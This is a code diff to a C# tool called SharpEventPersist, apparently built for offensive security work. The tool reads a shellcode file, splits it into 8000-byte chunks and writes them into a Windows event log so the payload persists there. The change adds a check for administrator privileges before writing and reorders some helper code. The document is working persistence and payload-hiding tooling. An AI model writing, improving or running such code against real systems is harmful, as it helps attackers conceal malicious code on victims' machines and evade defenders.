@@ -4,6 +4,7 @@ using System.Runtime.Remoting.Metadata.W3cXsd2001;
 using System.IO;
 using System.Linq;
 using NDesk.Options;
+using System.Security.Principal;
 
 namespace SharpEventPersist
 {
@@ -34,6 +35,21 @@ namespace SharpEventPersist
             KMSEventLog.Source = source;
             KMSEventLog.WriteEntry(shellcodeEvent, EventLogEntryType.Information, instanceint);
             EventWrites += 1;
+        }
+
+        public static string GetBytesToString(byte[] value)
+        {
+            SoapHexBinary hexbin = new SoapHexBinary(value);
+            return hexbin.ToString();
+        }
+
+        public static bool IsHighIntegrity()
+        {
+            // returns true if the current process is running with adminstrative privs in a high integrity context
+            // ref: https://github.com/GhostPack/Seatbelt/blob/fa0f2d94a049d825bef77e103e33167250ed2ac0/Seatbelt/Util/SecurityUtil.cs
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
         }
 
         static void Main(string [] args)
@@ -84,18 +100,22 @@ namespace SharpEventPersist
             Console.WriteLine("Setting event log source to: " + source);
             Console.WriteLine("Setting event log to: " + eventlog);
             int instanceint = Int16.Parse(instanceid);
-
             byte[] shellcode = File.ReadAllBytes(file);
-
             var realcount = (int)(shellcode.Length / 8000);
             var remainder = (int)(shellcode.Length % 8000);
+            EventLog log = new EventLog(eventlog);
+
+            if (!IsHighIntegrity())
+            {
+                Console.WriteLine("Not running in high integrity. Adding new event soure will fail.\nYou need write access to subkeys in HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\");
+                return;
+            }
 
             for (var i = 0; i < realcount; i++)
                 delegate_bytes(source, instanceid, eventlog, shellcode, 8000, i * 8000);
             
             delegate_bytes(source, instanceid, eventlog, shellcode, remainder, realcount * 8000);
 
-            EventLog log = new EventLog(eventlog);
             var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == instanceint).ToList();
 
             if (entries.Count == EventWrites)
@@ -108,10 +128,6 @@ namespace SharpEventPersist
 
 
         }
-        public static string GetBytesToString(byte[] value)
-        {
-            SoapHexBinary hexbin = new SoapHexBinary(value);
-            return hexbin.ToString();
-        }
+        
     }
 }
